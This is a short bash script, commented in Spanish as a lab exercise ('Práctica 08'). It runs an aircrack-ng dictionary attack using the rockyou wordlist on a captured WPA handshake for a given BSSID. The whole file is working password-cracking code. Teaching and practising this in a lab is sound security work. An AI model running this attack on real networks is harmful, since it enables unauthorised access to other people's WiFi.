#!/bin/bash
# Script para ejecutar ataque de diccionario con Aircrack-ng
# Práctica 08: WiFi Cracking con Aircrack-ng

# Parámetros del ataque
CAPTURE_FILE="${1:-captura_wpa-01.cap}"
BSSID="${2:-00:21:29:B3:96:6F}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

# Verificar handshake
aircrack-ng "$CAPTURE_FILE" 2>/dev/null | head -20

# Ejecutar ataque
sudo aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPTURE_FILE"
